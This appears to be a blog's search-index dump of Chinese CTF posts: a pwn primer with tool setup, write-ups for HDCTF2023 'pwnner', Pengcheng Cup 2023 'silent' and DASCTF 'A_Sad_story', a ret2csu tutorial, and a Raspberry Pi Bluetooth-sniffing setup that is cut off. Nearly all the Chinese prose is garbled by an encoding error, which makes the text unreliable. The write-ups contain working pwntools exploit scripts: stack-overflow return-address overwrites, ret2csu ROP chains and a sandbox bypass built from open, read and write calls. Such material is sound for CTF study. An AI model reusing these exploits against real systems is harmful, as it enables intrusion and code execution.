´ï¼Œè·å–æƒé™ï¼Œç”±â€ownâ€ä¸€æ¬¡å¼•ç”³è€Œæ¥ã€‚åœ¨CTFæ¯”èµ›ä¸­ï¼Œä¸€é“pwné¢˜é€šå¸¸ä¼šç»™è§£é¢˜è€…æä¾›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä¸€ä¸ªé¶æœºã€‚è§£é¢˜è€…éœ€è¦é€šè¿‡å¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘åˆ†æï¼Œæ‰¾åˆ°å…¶ä¸­çš„æ¼æ´å¹¶å¯¹æ¼æ´åŠ ä»¥åˆ©ç”¨ï¼Œæœ€ç»ˆå®ç°å¯¹é¶æœºçš„ææƒï¼ˆç®€å•pwné¢˜çš„è§£é¢˜è¯¦è§çœŸ.å…¥é—¨ä¹‹ä¸€é“pwné¢˜ï¼‰ã€‚\nå­¦Pwnèƒ½å­¦åˆ°ä»€ä¹ˆ    1.äº¿ç‚¹ç‚¹çš„é€†å‘å·¥ç¨‹ã€‚å¤§éƒ¨åˆ†Pwné¢˜éƒ½è¦æ±‚å…ˆå¯¹äºŒè¿›åˆ¶æ–‡ä»¶è¿›è¡Œé€†å‘åˆ†æï¼ŒæŒæ¡ä¸€å®šçš„é€†å‘æŠ€å·§æ˜¯å¿…ä¸å¯å°‘çš„ã€‚åŒCTFä¸­çš„reverseä¾§é‡äºç®—æ³•ç¨æœ‰ä¸åŒï¼ŒPwné¢˜çš„é€†å‘ä¾§é‡äºæ¼æ´çš„å‘ç°ä¸åˆ©ç”¨ã€‚   2.Cè¯­è¨€ä¸æ±‡ç¼–è¯­è¨€ä»¥åŠpythonã€‚é˜…è¯»äºŒè¿›åˆ¶æ–‡ä»¶åæ±‡ç¼–å‡ºçš„æ±‡ç¼–ä»£ç ä¸åç¼–è¯‘åçš„ä¼ªä»£ç éœ€è¦æœ‰ä¸€å®šçš„Cè¯­è¨€ä¸æ±‡ç¼–è¯­è¨€åŸºç¡€ã€‚æ¼æ´åˆ©ç”¨æ‰€å¸¸ç”¨çš„pwntoolsåº“çš„ä½¿ç”¨éœ€è¦ä¸€ä¸¢ä¸¢çš„pythonç¼–ç¨‹åŸºç¡€ã€‚    3.æ•°æ®ç»“æ„ä¸æ“ä½œç³»ç»Ÿã€‚CTFä¸­çš„Pwné¢˜ä¸€èˆ¬æ¶‰åŠæ ˆæº¢å‡ºã€å †æº¢å‡ºç­‰æ¼æ´ï¼Œè¦æ±‚è§£é¢˜è€…å¯¹æ•°æ®ç»“æ„æœ‰æ¯”è¾ƒæ·±çš„ç†è§£ã€‚åŒæ—¶ï¼Œç”±äºPwné¶æœºä¸€èˆ¬æ˜¯Linuxç³»ç»Ÿçš„é¶æœºï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿåœ¨Linuxç¯å¢ƒä¸‹ç¼–è¯‘è¿è¡Œï¼Œå› æ­¤ï¼Œå­¦ä¼šç†Ÿç»ƒä½¿ç”¨ã€æ·±å…¥ç†è§£Linuxç³»ç»Ÿæ˜¯æ¯ä¸ªPwnè§£é¢˜è€…çš„å¿…ä¿®è¯¾ã€‚å­¦Pwnéœ€è¦æœ‰çš„å¿ƒç†å‡†å¤‡    1.è‡ªå­¦æ‹‰æ»¡ï¼šæœ¬é˜Ÿä¼æ²¡æœ‰å¼ºPwnæ‰‹ï¼Œæ‰‹æŠŠæ‰‹æ•™å­¦ä»€ä¹ˆçš„åº”è¯¥æ²¡æœ‰ã€‚Pwnæ¶‰åŠçš„è®¡ç®—æœºåº•å±‚çŸ¥è¯†è¾ƒå¤šï¼Œéœ€è¦ä½ æ·±å…¥å­¦ä¹ å¹¶ç†è§£ã€‚    2.åç‰¢å‡†å¤‡ï¼šPwnæ‰€éœ€çš„å‰ç½®çŸ¥è¯†æ¯”è¾ƒå¤šï¼Œ0åŸºç¡€å…¥é—¨è€…å¯èƒ½å¾ˆä¹…éƒ½è§£ä¸äº†ä»€ä¹ˆé¢˜    3.åšå¥½å‡†å¤‡è·ŸçœŸæ­£çš„çˆ·çˆ·ç«äº‰ã€‚\nçœŸ.å…¥é—¨ä¹‹ç¯å¢ƒé…ç½®å¦‚æœä½ å‡†å¤‡å¥½è¸å…¥Pwnçš„å¤§é—¨ï¼Œæˆ‘ä»¬å…ˆä»ç¯å¢ƒé…ç½®å¼€å§‹å§    https://mirrors.tuna.tsinghua.edu.cn/    åœ¨è¿™é‡Œæ‰¾ä¸ªçº¯å‡€çš„Ubuntué•œåƒæ–‡ä»¶ï¼Œ18.04åˆ°22.04ä¹‹é—´çš„éƒ½å¯ä»¥ï¼ˆå»ºè®®ä¸è¦ç”¨kaliï¼Œç”¨æ¥åšè¿‡æ¸¡å¯ä»¥ï¼Œä½†æ˜¯ä¼šæœ‰äº›é—®é¢˜ï¼›22.04ä»¥ä¸Šå¤ªæ–°ï¼Œä¹Ÿä¼šæœ‰é—®é¢˜ã€‚å­˜å‚¨ç©ºé—´å¯Œæœ‰è€…å½“æˆ‘æ²¡è¯´ï¼‰ï¼Œå…ˆæ­å»ºèµ·è‡ªå·±çš„è™šæ‹Ÿæœºå§ã€‚    è¿™é‡Œè¯´è¯´åŸå› å“ˆï¼Œpythonçš„pwntoolsåœ¨Windowsç¯å¢ƒä¸‹è¿è¡Œä¼šæœ‰äº›é—®é¢˜ï¼Œæ­¤å¤–å½“ä½ è‡ªå·±ç ”ç©¶æ—¶ä¹Ÿéœ€è¦ç”¨åˆ°Linuxç¯å¢ƒã€‚    https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/çœ‹è¿™é‡Œæ¢æºæ›´æ–°\nsudo apt update &amp;&amp;sudo apt upgrade -ysudo apt install python3\nï¼ˆpsï¼šä»¥ä¸‹å®‰è£…è¿‡ç¨‹ä¸­ä¼šä¸‹è½½æ‰€éœ€çš„ä¾èµ–ï¼Œæ¯”è¾ƒåƒç½‘ç»œç¯å¢ƒï¼Œå¦‚æœä¸æˆåŠŸå¯ä»¥å¤šè¯•å‡ æ¬¡ï¼‰è£…pip\nsudo apt install pip\nè£…pwntoolsï¼Œè¿™ä¸ªåº“éå¸¸æœ‰ç”¨ï¼Œæ˜¯ä½ çš„å·¦è†€å³è‡‚ï¼ˆå¾ˆé‡è¦ï¼Œæœ€å¥½æœ‰æ—¶é—´èƒ½ç²¾è¯»å®ƒçš„æ‰‹å†Œï¼‰\npip install pwntools\nè£…gitï¼Œè¿™ä¸ªç”¨æ¥ä¸‹githubä¸Šçš„ä¸œè¥¿\nsudo apt install git\nè£…pwndbgï¼Œè¿™ä¸ªæ˜¯gdbçš„æ’ä»¶ï¼Œåœ¨è°ƒè¯•æ–¹é¢èƒ½ç»™ä½ å¾ˆå¤§å¸®åŠ©ï¼ˆè°ƒè¯•æ–¹æ³•è¯·è‡ªå­¦ï¼Œå¾ˆé‡è¦ï¼‰å…ˆè£…å››ä¸ªåº“ä¸ç„¶ä¼šæŠ¥é”™ï¼ˆä¸»è¦æ˜¯linuxä¸‹64ä½å’Œ32ä½çš„ç¯å¢ƒï¼‰\nsudo apt-get install libffi-devsudo apt-get install libssl-devsudo apt install libc6-dev-i386sudo apt-get install lib32z1cd Desktopgit clone https://github.com/pwndbg/pwndbgcd pwndbg./setup.shcd ..\nè£…ROPgadgetï¼Œè¿™ä¸ªå·¥å…·èƒ½å¸®ä½ æ‰¾åˆ°äºŒè¿›åˆ¶æ–‡ä»¶ä¸­å¯ç”¨çš„gadgetï¼Œä¹Ÿå¯ä»¥ç›´æ¥å¯¹é™æ€ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ç”ŸæˆROPé“¾\nsudo apt-get install python-capstonegit clone https://github.com/JonathanSalwan/ROPgadget.gitcd ROPgadgetsudo -H python3 setup.py install\none_gadgetï¼Œè¿™ä¸ªå·¥å…·èƒ½å¸®ä½ æ‰¾åˆ°ä¸€äº›å±é™©çš„å¯ä»¥åŠ ä»¥åˆ©ç”¨çš„æ±‡ç¼–ç‰‡æ®µ\nsudo apt-get install ruby ruby-devsudo gem install one_gadget\nseccomp-tools,è¿™ä¸ªå·¥å…·æ˜¯æŸ¥sandboxç”¨çš„\nsudo apt install gcc ruby-devgem install seccomp-tools\nçœŸ.å…¥é—¨ä¹‹ä¸€é“pwné¢˜ä»¥ä¸‹æ˜¯ä¸€é“pwné¢˜ï¼Œä¸æ˜¯æœ€ç®€å•çš„ï¼Œä½†æ˜¯å¾ˆå¥½åœ°å±•ç°äº†pwnæ‰‹è§£é¢˜çš„è¿‡ç¨‹ï¼Œå› æ­¤æ”¾åœ¨è¿™é‡Œã€HDCTF2023ã€‘pwnnerè€ƒç‚¹ï¼šå·²çŸ¥ç§å­éšæœºæ•°é¢„æµ‹+ç®€å•æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€æŸ¥ä¸ªä¿æŠ¤å…ˆ\nâ”Œâ”€â”€(str1d3rã‰¿str1k3Gwindows)-[~/Desktop]â””â”€$ checksec pwnner[*] &#x27;/Desktop/pwnner&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)```  å¼€äº†NXï¼Œä¸èƒ½ç›´æ¥åœ¨æ ˆä¸Šæ‰§è¡Œshellcodeï¼ˆå„ç±»ä¿æŠ¤æ˜¯éœ€è¦çŸ¥é“çš„ï¼‰è¿›IDAï¼Œçœ‹vulnå‡½æ•°ï¼ŒF5åç¼–è¯‘ï¼Œå‘ç°éœ€è¦ç»è¿‡ä¸€æ¬¡è¾“å…¥éšæœºæ•°çš„åˆ¤æ–­æ‰èƒ½åˆ°è¾¾æ¼æ´æ‰§è¡Œå¤„ï¼Œç”±äºç¨‹åºç»™äº†éšæœºæ•°ç§å­ï¼ˆä¼ªéšæœºï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç›´æ¥åœ¨æœ¬åœ°ç”Ÿæˆä¸€ä¸ªéšæœºæ•°æ¥é€šè¿‡éªŒè¯ï¼Œåˆ°è¾¾æ¼æ´æ‰€åœ¨å¤„å®Œæˆåˆ©ç”¨```c__int64 vuln()&#123;  int v0; // ebx  char buf[16]; // [rsp+0h] [rbp-50h] BYREF  char v3[64]; // [rsp+10h] [rbp-40h] BYREF  srand(0x39u); //ç§å­ä¸º0x39çš„éšæœºæ•°ç”Ÿæˆ  puts(&quot;you should prove that you love pwn,so input your name:&quot;);  read(0, buf, 0x10uLL); //å­˜åœ¨æº¢å‡º  v0 = atoi(buf);  if ( v0 == rand() )  &#123;    puts(&quot;ok,you have a little cognition about pwn,so what will you do next?&quot;);    read(0, v3, 0x100uLL);  &#125;  else  &#123;    puts(&quot;sorry,you are not a real pwnner&quot;);  &#125;  return 0LL;&#125;\nåˆå‘ç°ï¼šgetshellå‡½æ•°å†…ç›´æ¥æœ‰system(â€˜&#x2F;bin&#x2F;shâ€™),æ‰€ä»¥æ€è·¯å¦‚ä¸‹å…ˆé€šè¿‡éšæœºæ•°é¢„æµ‹ï¼Œå†åˆ©ç”¨æº¢å‡ºç‚¹è¦†ç›–å‡½æ•°è¿”å›åœ°å€ï¼Œè·³åˆ°getshellå‡½æ•°æˆåŠŸgetshelléšæœºæ•°é¢„æµ‹è„šæœ¬ï¼š\n#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;time.h&gt;int main()&#123;                srand(0x39u);        int v4 = rand();        printf(&quot;%d, &quot;,v4);&#125;\nç›´æ¥è´´è„šæœ¬\nfrom pwn import*       #å¼•å…¥pwntoolsåº“elf=ELF(&#x27;./pwnner&#x27;)  context.log_level = &#x27;debug&#x27; #è¿™ä¸ªèƒ½çœ‹åˆ°å›æ˜¾p = remote(&#x27;node1.anna.nssctf.cn&#x27;,28090)#é“¾æ¥é¶æœºp.recvuntil(&#x27;you should prove that you love pwn,so input your name:&#x27;)p.send(b&#x27;1956681178&#x27;) #é€šè¿‡éšæœºæ•°æ£€éªŒpayload = b&#x27;a&#x27;*64+b&#x27;b&#x27;*8+p64(0x4008b2)#å¡«å……åƒåœ¾æ•°æ®ï¼Œè¦†ç›–8ä½çš„è¿”å›åœ°å€ï¼Œå†è·³è½¬åˆ°getshellå‡½æ•°è·å¾—shellp.send(payload)    #å‘é€payloadp.interactive()    #äº¤äº’\næˆåŠŸæ‹¿åˆ°shell\n","categories":["basic"],"tags":["Linux"]},{"title":"ret2csu","url":"/2023/11/10/ret2csu/","content":"æœ€è¿‘æ‰è§åˆ°ä¸€é¢˜ç”¨csuè§£é¢˜çš„é¡ºä¾¿æ•´ç†ä¸€æ³¢åšæ ˆé¢˜ç»å¸¸èƒ½çœ‹è§__libc_csu_initè¿™ä¸ªå‡½æ•°ï¼Œèƒ½ä¸èƒ½åŠ ä»¥åˆ©ç”¨å‘¢\nåœ¨ 64 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°çš„å‰ 6 ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„ gadgetsã€‚è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ x64 ä¸‹çš„ __libc_csu_init ä¸­çš„ gadgetsã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹ libc è¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨ libc å‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚__libc_csu_init in IDA\n.text:0000000000400900                               ; void __fastcall _libc_csu_init(unsigned int, __int64, __int64).text:0000000000400900                               public __libc_csu_init.text:0000000000400900                               __libc_csu_init proc near               ; DATA XREF: _start+16â†‘o.text:0000000000400900                               ; __unwind &#123;.text:0000000000400900 41 57                         push    r15.text:0000000000400902 41 56                         push    r14.text:0000000000400904 49 89 D7                      mov     r15, rdx.text:0000000000400907 41 55                         push    r13.text:0000000000400909 41 54                         push    r12.text:000000000040090B 4C 8D 25 7E 04 20 00          lea     r12, __frame_dummy_init_array_entry.text:0000000000400912 55                            push    rbp.text:0000000000400913 48 8D 2D 7E 04 20 00          lea     rbp, __do_global_dtors_aux_fini_array_entry.text:000000000040091A 53                            push    rbx.text:000000000040091B 41 89 FD                      mov     r13d, edi.text:000000000040091E 49 89 F6                      mov     r14, rsi.text:0000000000400921 4C 29 E5                      sub     rbp, r12.text:0000000000400924 48 83 EC 08                   sub     rsp, 8.text:0000000000400928 48 C1 FD 03                   sar     rbp, 3.text:000000000040092C E8 4F FD FF FF                call    _init_proc.text:000000000040092C.text:0000000000400931 48 85 ED                      test    rbp, rbp.text:0000000000400934 74 20                         jz      short loc_400956.text:0000000000400934.text:0000000000400936 31 DB                         xor     ebx, ebx.text:0000000000400938 0F 1F 84 00 00 00 00 00       nop     dword ptr [rax+rax+00000000h].text:0000000000400938.text:0000000000400940.text:0000000000400940                               loc_400940:                             ; CODE XREF: __libc_csu_init+54â†“j.text:0000000000400940 4C 89 FA                      mov     rdx, r15.text:0000000000400943 4C 89 F6                      mov     rsi, r14.text:0000000000400946 44 89 EF                      mov     edi, r13d.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8].text:0000000000400949.text:000000000040094D 48 83 C3 01                   add     rbx, 1.text:0000000000400951 48 39 DD                      cmp     rbp, rbx.text:0000000000400954 75 EA                         jnz     short loc_400940.text:0000000000400954.text:0000000000400956.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34â†‘j.text:0000000000400956 48 83 C4 08                   add     rsp, 8.text:000000000040095A 5B                            pop     rbx.text:000000000040095B 5D                            pop     rbp.text:000000000040095C 41 5C                         pop     r12.text:000000000040095E 41 5D                         pop     r13.text:0000000000400960 41 5E                         pop     r14.text:0000000000400962 41 5F                         pop     r15.text:0000000000400964 C3                            retn.text:0000000000400964                               ; &#125; // starts at 400900.text:0000000000400964.text:0000000000400964                               __libc_csu_init endp\nfirst_csu\n.text:0000000000400956                               loc_400956:                             ; CODE XREF: __libc_csu_init+34â†‘j.text:0000000000400956 48 83 C4 08                   add     rsp, 8.text:000000000040095A 5B                            pop     rbx.text:000000000040095B 5D                            pop     rbp.text:000000000040095C 41 5C                         pop     r12.text:000000000040095E 41 5D                         pop     r13.text:0000000000400960 41 5E                         pop     r14.text:0000000000400962 41 5F                         pop     r15.text:0000000000400964 C3                            retn\nsecond_csu\n.text:0000000000400940                               loc_400940:                             ; CODE XREF: __libc_csu_init+54â†“j.text:0000000000400940 4C 89 FA                      mov     rdx, r15.text:0000000000400943 4C 89 F6                      mov     rsi, r14.text:0000000000400946 44 89 EF                      mov     edi, r13d.text:0000000000400949 41 FF 14 DC                   call    ds:(__frame_dummy_init_array_entry - 600D90h)[r12+rbx*8].text:0000000000400949.text:000000000040094D 48 83 C3 01                   add     rbx, 1.text:0000000000400951 48 39 DD                      cmp     rbp, rbx.text:0000000000400954 75 EA                         jnz     short loc_400940\nåœ¨first_csuï¼Œæˆ‘ä»¬å¯ä»¥é æ ˆæº¢å‡ºçš„æ•°æ®æ„é€ æ¥æ§åˆ¶rbx,rbp,r12,r13,r14,r15 å¯„å­˜å™¨çš„æ•°æ®åœ¨second_csuï¼Œr15èµ‹å€¼ç»™rdxï¼Œr14èµ‹å€¼ç»™rsiï¼Œr13dèµ‹å€¼ç»™ediï¼ˆéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶è¿™é‡Œèµ‹ç»™çš„æ˜¯ ediï¼Œä½†å…¶å®æ­¤æ—¶ rdi çš„é«˜ 32 ä½å¯„å­˜å™¨å€¼ä¸º 0ï¼Œæ‰€ä»¥å…¶å®æˆ‘ä»¬å¯ä»¥æ§åˆ¶ rdi å¯„å­˜å™¨çš„å€¼ï¼Œåªä¸è¿‡åªèƒ½æ§åˆ¶ä½ 32 ä½ï¼‰\nåœ¨0x40094Dæˆ‘ä»¬å¯ä»¥æ§åˆ¶ rbx ä¸ rbp çš„ä¹‹é—´çš„å…³ç³»ä¸º rbx+1 &#x3D; rbpï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ä¼šæ‰§è¡Œloc_400940ï¼Œè¿›è€Œå¯ä»¥ç»§ç»­æ‰§è¡Œä¸‹é¢çš„æ±‡ç¼–ç¨‹åºã€‚è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç®€å•çš„è®¾ç½® rbx&#x3D;0ï¼Œrbp&#x3D;1\næ‰‹æ“\ndef ret2csu(rbx,rbp,r12,r13,r14,r15):    payload = &#x27;a&#x27;*(padding)    payload += p64(first_csu)    payload += p64(rbx)+p64(rbp)#ä¸€èˆ¬ï¼šrbx = 0 ,rbp = 1    payload += p64(r12) #call.addr    payload += p64(r13) + p64(r14) + p64(r15) #ä¸‰ä¸ªå‚æ•°    payload += p64(second_csu)    payload += &#x27;a&#x27;*( 7 * 8 )    return payload\npwntoolsé›†æˆ(stack privoting_version)\nfrom pwn import*context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)r = ROP(binary_file)r.ret2csu(edi=0, rsi=0x601038, rdx=0x200, rbp=0x601038, call=elf.got[&#x27;read&#x27;])payload += r.chain()payload += p64(leave_ret)payload = payload.ljust(0x100, b&#x27;a&#x27;)p.send(payload)\n\n\n[é¹åŸæ¯2023 silent]checksec,full relro\n[*] &#x27;/mnt/Desktop/é¹åŸ/silent/silent&#x27;    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\nå¼€äº†æ²™ç›’ç¨‹åºå¾ˆç®€å•,å¾ˆå¤šå‡½æ•°éƒ½æ²¡æ³•å¤ç”¨æœ‰csuï¼Œèƒ½ç”¨read\nint __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[64]; // [rsp+10h] [rbp-40h] BYREF  init_seccomp();  alarm(0x1Eu);  setvbuf(stdin, 0LL, 2, 0LL);  setvbuf(stdout, 0LL, 2, 0LL);  read(0, buf, 0x100uLL);  return 0;&#125;\nret2csuæ”¹stdinä¸ºreadå¤šæ¬¡call readæ¥æ³„éœ²libcå¹¶å†™å…¥orwçš„shellcodeçœ‹wpæ˜¯1&#x2F;4096çš„æ¦‚ç‡æ‰“é€š\nfrom pwn import *from pwn import p64,u64binary = ELF(&quot;./silent&quot;)def exploit():    #p = process(&quot;./silent&quot;)    p=remote(&#x27;172.10.0.8&#x27;,9999)    #context.log_level = &#x27;debug&#x27;    context.log_level = &#x27;error&#x27;    # pause()    pop_rdi = 0x0000000000400963    pop_rsi_r15 = 0x0000000000400961    mov_rax_got = 0x0000000000400869    leave_ret = 0x0000000000400876      payload  = b&#x27;a&#x27; * 0x48    context.arch = &#x27;amd64&#x27;    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601038, rdx=0x110, rbp=0x601038, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    payload += p64(leave_ret)    payload = payload.ljust(0x100, b&#x27;a&#x27;)    p.send(payload)    jmp_rbp = 0x0000000000400a93    # : jmp qword ptr [rbp];     payload = b&#x27;a&#x27; * 8    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601030, rdx=3, rbp=0x601030, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    payload += p64(pop_rdi)    payload += p64(0x600fd8)#[0x600fd8] alarm@GLIBC_2.2.5 -&gt; 0x7ffff7e772c0 (alarm) â—‚â€” mov eax, 0x25    payload += p64(jmp_rbp)    r = ROP(binary)    r.ret2csu(edi=0, rsi=0x601148, rdx=0x100, rbp=0x601030, call=binary.got[&#x27;read&#x27;])    payload += r.chain()    p.send(payload)    # pause()    # sleep(0.5)    p.send(b&#x27;\\x70\\x29\\x84&#x27;)    try:        libc = u64(p.recvline(timeout=1)[:-1].ljust(8, b&#x27;\\x00&#x27;)) - 0xe44f0    except:        p.close()    else:        if libc &lt; 0:            return        success(f&quot;libc: &#123;hex(libc)&#125;&quot;)        pop_rsi = libc + 0x0000000000023a6a        pop_rdx = libc + 0x0000000000001b96        ret = 0x0000000000400696        flag_str = 0x6011e0        # payload = p64(one_gadget)        payload = p64(pop_rdi)        payload += p64(flag_str)        payload += p64(pop_rsi)        payload += p64(0)        payload += p64(libc + 0x10fbf0) # open        payload += p64(pop_rdi)        payload += p64(3)        payload += p64(pop_rsi)        payload += p64(flag_str)        payload += p64(pop_rdx)        payload += p64(0x100)        payload += p64(libc + 0x110020) # read        payload += p64(pop_rdi)        payload += p64(1)        payload += p64(pop_rsi)        payload += p64(flag_str)        payload += p64(pop_rdx)        payload += p64(0x100)        payload += p64(libc + 0x1100f0) # write        payload += b&#x27;./flag&#x27;        # pause()        sleep(1)        p.send(payload)        p.interactive()        p.close()        exit(0)count = 0while True:    print(f&quot;try: &#123;count&#125;&quot;)    count += 1    exploit()p.interactive()\n\n\n[DASCTF11æœˆæœˆèµ›(2023) A_Sad_story]å¼€äº†pieç›´æ¥çœ‹ä¸»è¦çš„æ¼æ´ç‚¹ï¼Œè¿™é‡Œæœ‰ä¸ªé€‰æ‹©é€‰ä¸€å¯ä»¥æ‹¿åˆ°åŸºå€é€‰äºŒå¯ä»¥æœ‰æ¬¡æº¢å‡ºï¼ˆé•¿åº¦å‡ ä¹æ— é™åˆ¶ï¼‰ä½†æ˜¯èµ°å®Œä¼šæœ‰æ®µsandboxç›´æ¥ä¸Šexpï¼Œè®°å½•è¿™æ³¢sandboxçš„ç»•è¿‡\nfrom pwn import *context.arch = &#x27;amd64&#x27;context.log_level = &#x27;debug&#x27;libc = ELF(&#x27;./libc-2.31.so&#x27;)  elf = ELF(&#x27;./challenge&#x27;)      p = process(&quot;./challenge&quot;)#p = remote(&quot;node4.buuoj.cn&quot;, 28133)def elf_base():    p.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;: &#x27;, b&#x27;1&#x27;)    p.recvuntil(b&#x27;0x&#x27;)    value = int(p.recv(12), 16) - 0x1249    return valueelf.address = elf_base()success(&quot;elf--&gt; %s&quot; + hex(elf.address))csu1 = elf.address + 0x1620csu2 = elf.address + 0x163aoffset = b&#x27;a&#x27; * 0x38# Craft the ROP chainrop_chain = [    csu2, 0, 1, 0, elf.got[&#x27;close&#x27;], 1, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280, 257, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280, 0, elf.got[&#x27;close&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 1, elf.address + 0x4280, 0x30, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got[&#x27;read&#x27;],    csu1, 0, 0, 0, 0, 0, 0, 0,    csu2, 0, 1, 2, elf.address + 0x4280, 0x30, elf.got[&#x27;close&#x27;],    csu1]#å¤§ä½¬çš„æ„é€ ï¼Œä»¥ä¸‹æˆ‘æ”¹æˆæˆ‘ç†Ÿæ‚‰çš„æ ·å­(def ret2csu(rbx,rbp,r12,r13,r14,r15):    payload = p64(csu2)    payload += p64(rbx)+p64(rbp)#ä¸€èˆ¬ï¼šrbx = 0 ,rbp = 1    payload += p64(r12) #call.addr    payload += p64(r13) + p64(r14) + p64(r15) #ä¸‰ä¸ªå‚æ•°    payload += p64(csu1)    payload += p64(0)*7    return payloadrop_chain =ret2csu(0,1,0,elf.got[&#x27;close&#x27;],1,elf.got[&#x27;read&#x27;]) rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280, 257, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280, 0, elf.got[&#x27;close&#x27;])rop_chain +=ret2csu(0, 1, 1, elf.address + 0x4280, 0x30, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got[&#x27;read&#x27;])rop_chain +=ret2csu(0, 1, 2, elf.address + 0x4280, 0x30, elf.got[&#x27;close&#x27;])payload2 = rop_chainpayload = b&#x27;&#x27;.join([p64(addr) for addr in rop_chain])p.sendline(b&#x27;2&#x27;)p.sendline(offset + payload)p.send(b&#x27;\\x15&#x27;)p.send(b&#x27;/flag&#x27; + b&#x27;\\x00&#x27; * (257 - 5))p.send(b&#x27;\\x00&#x27; * 1)p.interactive()","categories":["stack"],"tags":["rop"]},{"title":"åŸºäºæ ‘è“æ´¾5çš„è“ç‰™å—…æ¢ç¯å¢ƒé…ç½®","url":"/2024/01/18/raspberrypi/","content":"é¦–å…ˆæ ‘è“æ´¾çš„ç¯å¢ƒé…ç½®æˆ‘çš„æ˜¯æ ‘è“æ´¾5ï¼Œé€‰äº†64ä½çš„è®°å¾—é«˜çº§é€‰é¡¹é‡Œé¢å¼€sshæœåŠ¡å’Œé…ç½®WIFIçƒ§å½•å®ŒæŠŠSDå¡æ’è¿›æ’æ§½å°±å¯ä»¥å¯åŠ¨äº†\nç¨å¾®åæ§½ä¸€ä¸‹ä»–çš„æ¥å£ï¼Œæœ‰ç‚¹éš¾æ’ï¼‰ï¼Œæ‰€ä»¥è¿˜æ˜¯å–œæ¬¢ç”¨ssh\nsdå¡çš„æ’æ§½åœ¨èƒŒé¢ï¼ˆæˆ‘å…ˆæŠŠå¤–å£³è£…ä¸Šäº†æ‰¾äº†è€ä¹…233ï¼‰\næèµ·æ¥ä¹‹ååœ¨è·¯ç”±å™¨çš„åå°å°±èƒ½æ‰¾åˆ°æ ‘è“æ´¾çš„ip\nè¯•è¿‡ç”¨tigervncæè¿œç¨‹æ¡Œé¢ï¼Œå»¶è¿ŸæŒºå¤§çš„ï¼Œä½†èƒ½ç”¨\nè¿™é‡Œæœ‰ä¸ªåç»­ï¼Œçœ‹æ–‡ç« æœ«å°¾\nè¿ä¸Šå¼€å§‹é…ç¯å¢ƒ\næ¢ä¸ªæºå…ˆ\nsudo apt install vimsudo vim /etc/apt/sources.list\næ”¹æˆä»¥ä¸‹\ndeb https://mirrors.tuna.tsinghua.edu.cn/debian bookworm main contrib non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian-security bookworm-security main contrib non-free-firmwaredeb https://mirrors.tuna.tsinghua.edu.cn/debian bookworm-updates main contrib non-free-firmware\nè¿˜æœ‰ä¸€å¤„\nsudo vim /etc/apt/sources.list.d/raspi.list\næ”¹æˆä»¥ä¸‹\ndeb https://mirrors.tuna.tsinghua.edu.cn/raspberrypi bookworm main\n\næˆ‘ç”¨çš„è®¾å¤‡æ˜¯ubertoolth oneå¯ä»¥è·Ÿè¿™ä¸ªæ–‡æ¡£https://ubertooth.readthedocs.io/en/latest/index.htmlä½†æ˜¯æ ‘è“æ´¾5æ˜¯debian12çš„äº†ï¼Œwiresharkä¹Ÿæœ‰æ›´æ–°ï¼Œä¼šæœ‰äº›å°é—®é¢˜\nå…ˆè£…è“ç‰™ä¾èµ–\nsudo apt install cmake libusb-1.0-0-dev make gcc g++ libbluetooth-dev wget \\pkg-config python3-numpy python3-qtpy python3-distutils python3-setuptools\nlibbtbbï¼š\nwget https://github.com/greatscottgadgets/libbtbb/archive/2020-12-R1.tar.gz -O libbtbb-2020-12-R1.tar.gztar -xf libbtbb-2020-12-R1.tar.gzcd 